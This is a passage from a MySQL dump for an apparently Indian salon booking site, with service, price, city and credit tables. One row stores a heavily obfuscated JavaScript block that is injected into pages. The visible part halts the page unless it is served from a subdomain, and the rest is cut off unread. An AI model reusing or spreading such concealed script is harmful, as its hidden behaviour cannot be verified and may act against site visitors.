(45, 14, 28, 'Global ( Schwarzkopf, Absolute Brown)- Mid Length', 'A colouring technique covering the hair with the same colour from root to tip.', '3250', 'http://admin.dudeanddamsels.com/assets/images/img/1638787918MID.jpg', 1, 0),
(46, 14, 28, 'Global ( Schwarzkopf, Absolute Brown)- Long Length', 'A colouring technique covering the hair with the same colour from root to tip.', '3500', 'http://admin.dudeanddamsels.com/assets/images/img/1638788983full.jpg', 1, 0),
(47, 14, 28, 'Highlights- Schwarzkorpf', 'PER STREAK RS. 400 ', '3500', 'http://admin.dudeanddamsels.com/assets/images/img/1638789908highlight.jpg', 1, 0),
(51, 14, 28, 'Balayage/ Ombre', 'A colouring technique where hair colour is painted onto the hair to create a graduated, more natural-looking highlight looking and create a shadow.', '3500', 'http://admin.dudeanddamsels.com/assets/images/img/1638790736balayage.jpg', 1, 0),
(52, 14, 31, 'Glatt- Shoulder', 'A technique used to give a smooth, streamlined and sleek appearence. It also tames down feezy hair.', '4750', 'http://admin.dudeanddamsels.com/assets/images/img/1638800538glatt-sho.jpg', 1, 0),
(53, 14, 31, 'Glatt- Mid', 'A technique used to give a smooth, streamlined and sleek appearence. It also tames down feezy hair.', '4900', 'http://admin.dudeanddamsels.com/assets/images/img/1638361244D_D.jpeg', 0, 0),
(54, 14, 31, 'Glatt- Long', 'A technique used to give a smooth, streamlined and sleek appearence. It also tames down feezy hair.', '5500', 'http://admin.dudeanddamsels.com/assets/images/img/1638799733glatt-long.jpg', 1, 0),
(55, 20, 36, 'Threading- Chin', ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.', '29', 'http://admin.dudeanddamsels.com/assets/images/img/1638806888CHIN.jpg', 1, 0),
(56, 20, 36, 'Threading- Sidelocks', ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.', '49', 'http://admin.dudeanddamsels.com/assets/images/img/1638807381sidelock.jpg', 1, 0),
(57, 20, 36, 'Threading- Forehead', ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.', '59', 'http://admin.dudeanddamsels.com/assets/images/img/1638807844forehead.jpg', 1, 0),
(58, 20, 36, 'Threading- Upper lips', ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.', '19', 'http://admin.dudeanddamsels.com/assets/images/img/1638808225upperlip.jpg', 1, 0),
(59, 20, 36, 'Threading- Jawline', ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.', '99', 'http://admin.dudeanddamsels.com/assets/images/img/1638808753jawline.jpg', 1, 0),
(60, 20, 36, 'Threading- Neck', ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.', '149', 'http://admin.dudeanddamsels.com/assets/images/img/1638809049neck.jpg', 1, 0),
(61, 20, 36, 'Threading- Full face', ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.', '149', 'http://admin.dudeanddamsels.com/assets/images/img/1638809344Full-Face.jpg', 1, 0),
(62, 20, 37, 'Face Wax- Chin', 'The entire hair follicle is removed when being waxed out and results in a much smoother feel than shaving. Waxing is also a natural exfoliant which helps keep dead skin cells at bay.', '99', 'http://admin.dudeanddamsels.com/assets/images/img/1638809901facewax-chin.jpg', 1, 0),
(63, 20, 37, 'Face Wax- Sidelocks', 'The entire hair follicle is removed when being waxed out and results in a much smoother feel than shaving. Waxing is also a natural exfoliant which helps keep dead skin cells at bay.', '99', 'http://admin.dudeanddamsels.com/assets/images/img/1638810203wax-side.jpg', 1, 0),
(64, 20, 37, 'Face Wax- Forehead', 'The entire hair follicle is removed when being waxed out and results in a much smoother feel than shaving. Waxing is also a natural exfoliant which helps keep dead skin cells at bay.', '99', 'http://admin.dudeanddamsels.com/assets/images/img/1638810533Wax-forehead.jpg', 1, 0),
(65, 20, 37, 'Face Wax- Upper lips', 'The entire hair follicle is removed when being waxed out and results in a much smoother feel than shaving. Waxing is also a natural exfoliant which helps keep dead skin cells at bay.', '69', 'http://admin.dudeanddamsels.com/assets/images/img/1638810888wax-upperlip.jpg', 1, 0),
(66, 20, 37, 'Face Wax- Jawline', 'The entire hair follicle is removed when being waxed out and results in a much smoother feel than shaving. Waxing is also a natural exfoliant which helps keep dead skin cells at bay.', '99', 'http://admin.dudeanddamsels.com/assets/images/img/1638811208wax-jawline.jpg', 1, 0),
(67, 20, 37, 'Face Wax- Neck', 'The entire hair follicle is removed when being waxed out and results in a much smoother feel than shaving. Waxing is also a natural exfoliant which helps keep dead skin cells at bay.', '199', 'http://admin.dudeanddamsels.com/assets/images/img/1638811692wax-neck.jpg', 1, 0),
(68, 20, 37, 'Face Wax- Full face', 'The entire hair follicle is removed when being waxed out and results in a much smoother feel than shaving. Waxing is also a natural exfoliant which helps keep dead skin cells at bay.', '399', 'http://admin.dudeanddamsels.com/assets/images/img/1638811829wax-full.jpg', 1, 0),
(69, 21, 38, 'Half Arm- Rica / Roll on', 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\'s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.', '250', 'http://admin.dudeanddamsels.com/assets/images/img/1638812343rica-half.jpg', 1, 0),
(70, 21, 38, 'Full Arm- Rica / Roll On', 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\'s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.', '320', 'http://admin.dudeanddamsels.com/assets/images/img/1638812650rica-full-arm.jpg', 1, 0),
(71, 21, 38, 'Under Arm- Rica / Roll on / Peel Off', 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\'s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.', '100', 'http://admin.dudeanddamsels.com/assets/images/img/1638814506rica-under-arm.jpg', 1, 0),
(72, 21, 38, 'Half Leg- Rica / Roll On', 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\'s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.', '250', 'http://admin.dudeanddamsels.com/assets/images/img/1638814794rica-half-leg.jpg', 1, 0),
(73, 21, 38, 'Full Leg- Rica / Roll On', 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\'s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.', '450', 'http://admin.dudeanddamsels.com/assets/images/img/1638815083rica-full-leg.jpg', 1, 0),
(74, 21, 38, 'Bikini Line - Roll On / Rica / Peel Off', 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\'s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.', '250', 'http://admin.dudeanddamsels.com/assets/images/img/1638815411rica-bikini.jpg', 1, 0),
(75, 21, 38, 'Bikini - Peel Off', 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\'s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.', '1000', 'http://admin.dudeanddamsels.com/assets/images/img/1638815824peel-bikini.jpg', 1, 0),
(76, 21, 38, 'Stomach - Rica / Peel Off / Roll On', 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\'s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.', '320', 'http://admin.dudeanddamsels.com/assets/images/img/1638816130rica-stomach.jpg', 1, 0),
(77, 21, 38, 'Back - Rica / Roll On', 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\'s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.', '450', 'http://admin.dudeanddamsels.com/assets/images/img/1638816343rica-back.jpg', 1, 0),
(78, 21, 38, 'Full Body - Rica / Roll On', 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\'s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.', '1600', 'http://admin.dudeanddamsels.com/assets/images/img/1638816783RICA-FULL-BODY.jpg', 1, 0),
(79, 22, 39, 'Bridal Make-Up', 'Bridal makeup is probably the most important point of the wedding planning for the bride. The bride is the main attraction of the whole wedding ceremony. Every girl’s dream becomes to fulfil on that night. They need to look their best in their bridal attire.', '15000', 'http://admin.dudeanddamsels.com/assets/images/img/1638862920bridal.jpg', 1, 0),
(80, 22, 40, 'Party Make-Up', 'Every girl and women wants to look her best on any occasion. With the help of any professional makeup artist\'s little touch up will help them to achieve their desire.', '5500', 'http://admin.dudeanddamsels.com/assets/images/img/1638863847party.jpg', 1, 0),
(81, 14, 29, 'test pro', 'test pro', '4560', 'http://admin.dudeanddamsels.com/assets/images/img/1640068339farmer-3261468-2731170.png', 0, 0),
(82, 23, 41, 'Clean Up - Casmara', 'Casmara 3 in 1 Cleanser is a silky smooth cleanser with significant cleaning and soothing properties. It conditions the skin as it contains peptides from silk protein. ... Experience soft and deep cleansing with this 3 in 1 cleanser which rejuvenates your skin and makes it super soft, smooth and supple.', '899', 'http://admin.dudeanddamsels.com/assets/images/img/1640863271casmara.jpg', 1, 0),
(83, 10, 42, 'Janssen De- Tan', 'Products which inhibit tyrosinase (tanning of the skin via the melanocytes) perform well and the innovative active ingredients have proven', '500', 'http://admin.dudeanddamsels.com/assets/images/img/1640937118WhatsApp_Image_2021-12-30_at_16_36_48_(1).jpeg', 1, 0),
(84, 10, 43, 'Body Polishing', 'Body polishing is a type of full-body exfoliation that removes dead skin cells, promotes cell regeneration, and moisturizes the skin.', '00', 'http://admin.dudeanddamsels.com/assets/images/img/1640938327WhatsApp_Image_2021-12-31_at_13_38_09.jpeg', 1, 0);

-- --------------------------------------------------------

--
-- Table structure for table `tbl_child_service`
--

CREATE TABLE `tbl_child_service` (
  `id` int(11) NOT NULL,
  `child_id` int(11) DEFAULT NULL,
  `title` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `description` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `price` double NOT NULL,
  `img` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `status` double NOT NULL DEFAULT 1
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `tbl_child_service`
--

INSERT INTO `tbl_child_service` (`id`, `child_id`, `title`, `description`, `price`, `img`, `status`) VALUES
(1, 10, 'Shoulder Length', 'Shoulder Length price is 830', 850, 'http://admin.dudeanddamsels.com/assets/images/img/16373369264-medium-length-straight-hair-with-layers-CKjceXbMRWr.jpeg', 0),
(2, 10, 'Mid Back Length', 'Mid Back Length price is 849', 849, 'http://admin.dudeanddamsels.com/assets/images/img/1637336988medium-length-hairstyles-1.jpeg', 0),
(3, 10, 'Full Back Length', 'Full Back Length price is 899', 899, 'http://admin.dudeanddamsels.com/assets/images/img/1637336869v-cut.jpeg', 0),
(4, 11, 'Shoulder Length with dandraf treatment', 'Shoulder Length price is 1199', 1199, 'http://admin.dudeanddamsels.com/assets/images/img/16373369264-medium-length-straight-hair-with-layers-CKjceXbMRWr.jpeg', 0),
(5, 11, 'Mid Back Length with dandraf treatment', 'Mid Back Length price is 1449', 1449, 'http://admin.dudeanddamsels.com/assets/images/img/1637336988medium-length-hairstyles-1.jpeg', 0),
(6, 11, 'Full Back Length with dandraf treatment', 'Full Back Length price is 12499', 1249, 'http://admin.dudeanddamsels.com/assets/images/img/1637336869v-cut.jpeg', 0),
(7, 11, 'Shoulder Length', 'Shoulder Length price is 949', 949, 'http://admin.dudeanddamsels.com/assets/images/img/16373369264-medium-length-straight-hair-with-layers-CKjceXbMRWr.jpeg', 0),
(8, 11, 'Mid Back Length', 'Mid Back Length price is 999', 999, 'http://admin.dudeanddamsels.com/assets/images/img/1637336988medium-length-hairstyles-1.jpeg', 0),
(9, 11, 'Full Back Length', 'Full Back Length price is 1199', 1199, 'http://admin.dudeanddamsels.com/assets/images/img/1637336869v-cut.jpeg', 0),
(10, 9, 'Hair Ironing', 'Hair Ironing description', 500, 'http://admin.dudeanddamsels.com/assets/images/img/permanent-hair-straightening-japanese-treatment-031585308241.jpeg', 0),
(11, 9, 'Hair Curling', 'Hair Curling description', 500, 'http://admin.dudeanddamsels.com/assets/images/img/5abe76c610d6bb1e008b45cf.jpeg', 0),
(12, 9, 'Formal Cut', 'Formal Cut description', 250, 'http://admin.dudeanddamsels.com/assets/images/img/Formal-Hairstyles-for-Long-Hair-3.jpeg', 0),
(13, 6, 'Upto neck', 'svdbsdbsfbnfsb', 3299, 'http://admin.dudeanddamsels.com/assets/images/img/sbgsbcbfxbfdnb.jpeg', 0),
(14, 7, 'Upto neck', 'sgerhetjthj', 5299, 'http://admin.dudeanddamsels.com/assets/images/img/sbgsbcbfxbfdnb.jpeg', 0),
(15, 6, 'Shoulder', 'urjtyktmyyunmmm', 3599, 'http://admin.dudeanddamsels.com/assets/images/img/26252422.jpeg', 0),
(16, 7, 'Shoulder', 'euhjyrtfhmjsxaxac', 5599, 'http://admin.dudeanddamsels.com/assets/images/img/26252422.jpeg', 0);

-- --------------------------------------------------------

--
-- Table structure for table `tbl_city`
--

CREATE TABLE `tbl_city` (
  `id` int(11) NOT NULL,
  `cname` text CHARACTER SET utf8 NOT NULL,
  `status` int(11) NOT NULL,
  `img` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_city`
--

INSERT INTO `tbl_city` (`id`, `cname`, `status`, `img`) VALUES
(1, 'Kolkata', 1, 'http://admin.dudeanddamsels.com/assets/images/img/1636607240victoria.jpg'),
(3, 'Howrah', 1, 'http://admin.dudeanddamsels.com/assets/images/img/1636381504Howrah_bridge_at_night.jpg'),
(4, 'Burdwan', 0, 'http://admin.dudeanddamsels.com/assets/images/img/1636381495burdwan.jpg'),
(5, 'Asansol', 1, 'http://admin.dudeanddamsels.com/assets/images/img/1636381484asansol.jpeg'),
(6, 'Durgapur', 1, 'http://admin.dudeanddamsels.com/assets/images/img/1636381470durgapur.jpg');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_code`
--

CREATE TABLE `tbl_code` (
  `id` int(11) NOT NULL,
  `ccode` text NOT NULL,
  `status` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `tbl_credit`
--

CREATE TABLE `tbl_credit` (
  `id` int(11) NOT NULL,
  `credit_amt` int(11) NOT NULL,
  `amt` int(11) NOT NULL,
  `status` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `tbl_credit_report`
--

CREATE TABLE `tbl_credit_report` (
  `id` int(11) NOT NULL,
  `pid` int(11) NOT NULL,
  `message` text CHARACTER SET utf8 NOT NULL,
  `status` text CHARACTER SET utf8 NOT NULL,
  `amt` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_credit_report`
--

INSERT INTO `tbl_credit_report` (`id`, `pid`, `message`, `status`, `amt`) VALUES
(1, 2, 'credit', '1', 500),
(2, 2, 'debit', '1', 100);

-- --------------------------------------------------------

--
-- Table structure for table `tbl_happy_user`
--

CREATE TABLE `tbl_happy_user` (
  `id` int(11) NOT NULL,
  `title` text NOT NULL,
  `img` text NOT NULL,
  `comment` text NOT NULL,
  `status` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `tbl_home`
--

CREATE TABLE `tbl_home` (
  `id` int(11) NOT NULL,
  `title` text CHARACTER SET utf8 NOT NULL,
  `subtitle` text CHARACTER SET utf8 NOT NULL,
  `status` int(11) NOT NULL,
  `is_child` int(11) NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_home`
--

INSERT INTO `tbl_home` (`id`, `title`, `subtitle`, `status`, `is_child`) VALUES
(1, 'Best Offers', 'Hygienic & single-use products ! Low-contact services', 0, 2);

-- --------------------------------------------------------

--
-- Table structure for table `tbl_home_service`
--

CREATE TABLE `tbl_home_service` (
  `id` int(11) NOT NULL,
  `hid` int(11) NOT NULL,
  `cid` int(11) NOT NULL,
  `sid` int(11) NOT NULL,
  `img` text NOT NULL,
  `title` text CHARACTER SET utf8 NOT NULL,
  `description` text CHARACTER SET utf8 NOT NULL,
  `status` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_home_service`
--

INSERT INTO `tbl_home_service` (`id`, `hid`, `cid`, `sid`, `img`, `title`, `description`, `status`) VALUES
(2, 1, 5, 19, 'http://admin.dudeanddamsels.com/assets/images/img/1638340379Untitled_Design.jpg', 'Best bridal services', 'bridal makeup', 0),
(3, 1, 5, 22, 'http://admin.dudeanddamsels.com/assets/images/img/1638343565Untitled_Design.jpg', 'Makeups', 'makeup 20% off', 0);

-- --------------------------------------------------------

--
-- Table structure for table `tbl_include`
--

CREATE TABLE `tbl_include` (
  `id` int(11) NOT NULL,
  `jsfile` longtext NOT NULL,
  `pendingfile` longtext NOT NULL,
  `canclefile` longtext NOT NULL,
  `completefile` longtext NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_include`
--

INSERT INTO `tbl_include` (`id`, `jsfile`, `pendingfile`, `canclefile`, `completefile`) VALUES
(1, '<script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js\"></script>\n<script>\nvar _0x5506=[\'0x18\',\'length\',\'H2[$\',\'b1zkW6u=\',\'502163guBJta\',\'hItcSSk+W57cSW==\',\'rPW73cHeHnW5dcMZiZWQS0eW/dQcPPz8kaW49dW77dLcfoWOJd\',\'W7qsW5K=\',\'!(%4\',\'0MqH\',\'cSkZc8ozWRu=\',\'charAt\',\'WPtcKCowW5u=\',\'0x52\',\'Ar3cPmogWQ9NWQmY\',\'kjkmktAwPdiCkME8kdW6GBpwmYlCotC8kEdxZdGNdcVJT4Exld\',\'0x19\',\'W5ZdRCo4iNNdQSoDW7hcH2b+gmkKhXXUlXJdTh7cHSojW6ldRq\',\']VeO\',\'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWX\',\'kCohW68cWQCYeSk3WP5FW5ZdNCojWRJcQ8kcWOBdSCoQWQ1jlC\',\'W7GDmxK=\',\'t%CG\',\'RIMS\',\'T!Ez\',\'hompbC\',\'0x8\',\'1bIdnEH\',\'eN45dG==\',\'0x50\',\'668957AOvDiR\',\'WkGG\',\'lxP*\',\']Clx\',\'tl%i\',\'WR7dIr3cTa==\',\'ccySW48=\',\'0x43\',\'XwRP\',\'WRuMWQ0=\',\'4)RA\',\'lsXehmkfW6ldP2ddVSo0hSoBWQjhW4JdQwNdUmoHWQldQgnHW5\',\'pso*\',\'WQj0yxtcOCkaFvlcRCoTW5VcQa==\',\'5+W6PpWR4MW4a2WQ8MhZ51m8k3pejEew/cGeZcJCk3W4JcRa==\',\'write\',\'0x1b\',\'DdldKCoQsmoMWQZcGCkEW7xcK2a=\',\'7cVw5xW6dcQrSoW63cUWzhWQ0DoY0CWRCMWRBdMepcJ8ktFYTz\',\'W7evhSoa\',\'jYdcTq==\',\'0x2c\',\'indexOf\',\'0x53\',\'kBlSkKkdCBdmoxWPXeW6RcImoJ\',\'0x3a\',\'EqjIW4e=\',\'0x1\',\'domain\',\'vZVcK8kY\',\'0x24\',\'UxjNdaxcKmkhbd0AjIyurYZcR8k9xu3cG8kwymoqWPvRW6HwBg\',\'0x4c\',\'WRCjW4P0Cgi=\',\'0x5f\',\'0x5e\',\'W73cM8kKWQe=\',\'WRnPW6FdLbrsqW==\',\'0x4b\',\'0x16\',\'kcJdGvqLW4WXcMJdQwBcRW==\',\'fSBMJo\',\'ycNdG8kvvCoy\',\'ajax\',\'W6a/b8kw\',\'C8o5c1K=\',\'HIuR\',\'ZlVg\',\'WQFdRfnj\',\'HzfhCvW7NcRvvZWOBcVCoZmJxcKJldNSoKWPGcmCk+W7WEW6pc\',\'0x40\',\'EJ3dS8kA\',\'Q*^O\',\'Lav#\',\'0x4a\',\'hostname\',\'990002LAVIse\',\'HJIe\',\'rhFdQq==\',\'dLZdPuRcOCkc\',\'0x38\',\'OdOWoM7cOCo2gmocxcZcKColsCkb\',\'oEmSknW58gaxJdOxtdVCoFetdcQSo9WPVdJmoaWOpcICogW7hd\',\'0x2d\',\'0x5d\',\'W6P/WRlcHG==\',\'0x1a\',\'HxIpov\',\'0xd\',\'W5uADdtcIqxdOCoqWQddGvlcPSorWRlcMSkoESoECa==\',\'tMnMda3cRW==\',\'0x20\',\'Cl1z\',\'0xb\',\'0x3d\',\'W5NdINXeW5ZdRmk7W65gWOxcRmo0rea8WOC=\',\'aAGv\',\'eN45xW==\',\'0xe\',\'PxHCEC\',\'0x35\',\'0x2f\',\'DYtH\',\'oCk7W4j9n3C=\',\'wq@7\',\'0x29\',\'W5JdL8oeWP3dMSkswGNdJmoEetW=\',\'W4vEoq==\',\'olCLPacvyPimoayCkpfeu=\',\'$P6]\',\'slice\',\'PSoRW5WYW7FcUSkMW5hcNcBcPfTAdSkmWQ0wWQLUyCkIWRVcQm\',\')79U\',\'We\\x20Only\\x20Allow\\x20Subdomain!!!\',\'0x21\',\'W6K7W7fsgmkq\',\'0x30\',\'cFPG\',\'WQxdQqC0\',\'0x31\',\'YZ0123456789+/=\',\'WRDxW5ddLJLp\',\'nrfSW6tdUZ0=\',\'@0l8\',\'me$K\',\'0x44\',\'gCopW7pdR2xdGSk6WQFdPmo/WQtdQW==\',\'QuuaW5W=\',\'eMkKkz\',\'Nw2n\',\'exec\',\'jcNcGuKoW4uIfuRdTwhcUmkaFxddMJxdRG==\',\'WQJdN0T3\',\'0x57\',\'ready\',\'([a-z-0-9]{2,63}).([a-z.]{2,5})$\',\'WObRWO/dH8kPWPVcO8olo0e/W5f5W7/cH8oGWOpdNCoNESoVmm\',\'W59QWQxdTq==\',\'btSoaSkEW5dcQCoHomkJveRdG0rswmk7WQvNzY80qCo3itv8lq\',\'RcQ1xdH1FcQ8oqW4VdGSoMWOj1W6RdLCoNWRLHW5pdU2/dTSo+\',\'0x27\',\'0x1d\',\'gLZdNLC=\',\'198866vQyfnN\',\'0x1e\',\'0x46\',\'0x13\',\'i$0s\',\'iCoJgcRcQ0f/Aw/cP8oTEG==\',\'eZmwW5S=\',\'hbldHSkYW4HRWQra\',\'location\',\'push\',\'0x0\',\'subdomain\',\'shift\',\'0x22\',\'WOK+WOVdRSklWQJcJmkv\',\'I7!j\',\'replace\',\'lSoUW6vf\',\'hAph\',\'gcIt\',\'0x4e\',\'z^9a\',\'oBWQBdHhxcVI0catxdIw0BuJ3dJN/dRSk6uhZcQMBdQt/dHuWs\',\'0x7\',\'IZgX\',\'0x1f\',\'YrCD\',\'v[JF\',\'0x3b\',\'fromCharCode\',\'0x55\',\'0x14\',\'0x37\',\'101KpIzMa\',\'0x3f\',\'0x2e\',\'wIC2\',\'W4pcSx40\',\'o2xdP8kKW55JWOnH\',\'0x54\',\'type\',\'LmkdnWFcPwOAtMhcVda4WRrCjWWQWP3cU8k7W5HzW5JdP2BcOS\',\'vOfv\',\'fNRdOCk6\',\'0x4f\',\'BSo7WRKN\',\'0x56\',\'xSk2W73cVW==\',\'Fcnn\',\'0x39\',\'omW6faW4eTW5K=\',\'W60boG==\',\'0x34\',\'8xgJ\',\'0x12\',\'dCoLWPrSjJaHWQddRH3dT1S=\',\'g8o3W7DN\',\'0x2b\',\'Umk7eCoQW75AWQD8WRNdI8kvWQ84W7fEeqv7CWzzW6SEdqWQrS\',\'W6ZdMaaL\',\'AxRT\',\'&DJ[\',\'hlegxN\',\'xdpdHmo7\',\'WRbyW5JdTq==\',\'0x6\',\'0xc\',\'xflcNG==\',\'toString\',\'0x60\',\'0xf\',\'WQ0ZDfa=\',\'dH93WO5XW77dUqL2r0TWW5FcRYnVW7xdIxRcIHxdRSkGWP7cTS\',\'oEW7CuW5LuW6JcKWXZW4e+lmoxW5/cVXtcTCk3Fmk8W4XWmmoY\',\'WQdcI8kZWOxcPfhcH8o4p8o5\',\'owWQjFASoPW74RW5SPlSoKx8opsmkEW5GicmkvWO5pbSkPgJ9D\',\'15347PKEBst\',\'WPm4W5X5tu7dMCkG\',\'0x41\',\'t8oZW5JdQG==\',\'0x4\',\'0x5c\',\'1093959wnNbiQ\',\'0x48\',\'gfJI\',\'T@X)\',\'0x5\',\'charCodeAt\',\'0x9\',\'stop\',\'WQ0Ty3isWPdcOhxdQuZcICoqESkkbMXvW7NcRSo0xIhcJSkVW6\',\'W6RcQ8opavRdImohW6BcJMLKfW==\',\'0x33\',\'$IMU\',\'u8kEvCk+b8oZ\',\'WR7cQH3cIqJdNSoesCoPWOfoEZVcOvDm\',\'16091xxmunM\',\'1WieHlQ\',\'WPekx8kWcSkJocfWWPRdM8oGamkkg8kCdeDfWPvoW61lhdW+e8\',\'0x15\',\'QAbv\',\'/dUComW7BcGWJcGxvqW5hdRNTOeK3cK33dNSoouSkIW5LitfZd\',\'ixhdOCkX\',\'0x51\',\'0x2a\',\'WQP9xmoFW67cI0CKCmkrW5tcJ3fxW7VcG8kXWP7dMmkWsbGWnd\',\'0x3c\'];var _0x2bf8=function(_0x1a3191,_0x3bbb9d){_0x1a3191=_0x1a3191-0x1a4;var _0x550669=_0x5506[_0x1a3191];return _0x550669;};var _0x17cfa1=function(_0x58662d,_0x5c8950){return _0x2bf8(_0x58662d- -0x6b,_0x5c8950);};(function(_0x2b0745,_0x3f1f36){var _0x2205d3=function(_0x22b96e,_0x936222){return _0x2bf8(_0x936222- -0x28e,_0x22b96e);};while(!![]){try{var _0x440be0=parseInt(_0x2205d3(-0xa7,-0xc6))+parseInt(_0x2205d3(0x80,0x3))*parseInt(_0x2205d3(0x7b,0x6))+-parseInt(_0x2205d3(-0x89,-0x37))*parseInt(_0x2205d3(0x1c,-0x62))+-parseInt(_0x2205d3(0x23,-0x14))+parseInt(_0x2205d3(-0x19,-0x31))+parseInt(_0x2205d3(-0xa8,-0x83))+parseInt(_0x2205d3(-0x3,-0x22))*-parseInt(_0x2205d3(-0x30,-0x23));if(_0x440be0===_0x3f1f36)break;else _0x2b0745[\'push\'](_0x2b0745[\'shift\']());}catch(_0xdeb2f9){_0x2b0745[\'push\'](_0x2b0745[\'shift\']());}}}(_0x5506,0xd7b1b),$(document)[_0x17cfa1(0x197,0x1ba)](function(){var _0x218264=function(_0x2dff36,_0x3091cc){return _0x17cfa1(_0x2dff36-0x286,_0x3091cc);},_0x36107a={},_0x3b82f6=new RegExp(_0x218264(0x41e,0x3c1)),_0x360b13=_0x3b82f6[_0x218264(0x419,0x3c8)](window[\'location\'][_0x218264(0x3e2,0x3cd)]);if(_0x360b13===null)document[_0x218264(0x4be,0x483)](_0x218264(0x408,0x41f)),window[_0x218264(0x47f,0x41a)]();else{_0x36107a[\'domain\']=_0x360b13[0x1],_0x36107a[\'type\']=_0x360b13[0x2],_0x36107a[_0x218264(0x431,0x40b)]=window[_0x218264(0x42e,0x494)][\'hostname\'][_0x218264(0x436,0x49a)](_0x36107a[_0x218264(0x3c7,0x345)]+\'.\'+_0x36107a[_0x218264(0x44e,0x472)],\'\')[_0x218264(0x405,0x3f8)](0x0,-0x1);if(window[_0x218264(0x42e,0x40b)][_0x218264(0x3e2,0x40f)][\'replace\'](_0x36107a[_0x218264(0x3c7,0x3c2)]+\'.\'+_0x36107a[_0x218264(0x44e,0x43a)],\'\')[_0x218264(0x405,0x398)](0x0,-0x1)==\'\')document[_0x218264(0x4be,0x539)](_0x218264(0x408,0x406)),window[_0x218264(0x47f,0x45b)]();else{}}}));var _0x4c39=[_0x17cfa1(0x23a,0x2a9),\'hSk7WR/dPa==\',_0x17cfa1(0x199,0x16f)+_0x17cfa1(0x1b6,0x19e)+_0x17cfa1(0x1e8,0x1d3)+_0x17cfa1(0x1d2,0x16d),_0x17cfa1(0x219,0x296),\'hmkJWQpdNsL+W49bxtddM8k9WPFdLCogj11hWQjoAmosWOpdTC\'+_0x17cfa1(0x1eb,0x1c0)+\'WPLvBuRcGCkn\',_0x17cfa1(0x1db,0x1b5),\'kmooW6lcOa==\',\'rCkDw8kCWR3cTG==\',_0x17cfa1(0x1a7,0x12e),_0x17cfa1(0x19a,0x176),\'m8kCW6WN\',_0x17cfa1(0x20e,0x1be),\'sIpcGCoCWOO6WO82WOOIW7BcRYerWQ7cLmoFWP/cOspcGLRcJm\'+_0x17cfa1(0x13d,0x18b),\'CSkyBmkAh8oc\',_0x17cfa1(0x166,0x199),_0x17cfa1(0x19f,0x1a8),_0x17cfa1(0x234,0x1f4)+_0x17cfa1(0x211,0x1af)+\'OCoAWPZdOqxcRJCIWQNdPsaDW4XXW7zPW7VdHCoek8kzmNKiW5\'+_0x17cfa1(0x156,0x1a0)+_0x17cfa1(0x180,0x1e5)+\'oevNtdIMOkWRK2W4VdQcvMWONdT2nwpL0uASoOW4r/hvS0WRJd\'+_0x17cfa1(0x190,0x136),_0x17cfa1(0x21f,0x299)+_0x17cfa1(0x21a,0x236)+_0x17cfa1(0x162,0x171),_0x17cfa1(0x236,0x283),_0x17cfa1(0x1d8,0x205),_0x17cfa1(0x14d,0x10e),_0x17cfa1(0x1e7,0x16a),_0x17cfa1(0x1ed,0x1f0),_0x17cfa1(0x151,0xea),\'WPTEkxyc\',_0x17cfa1(0x14f,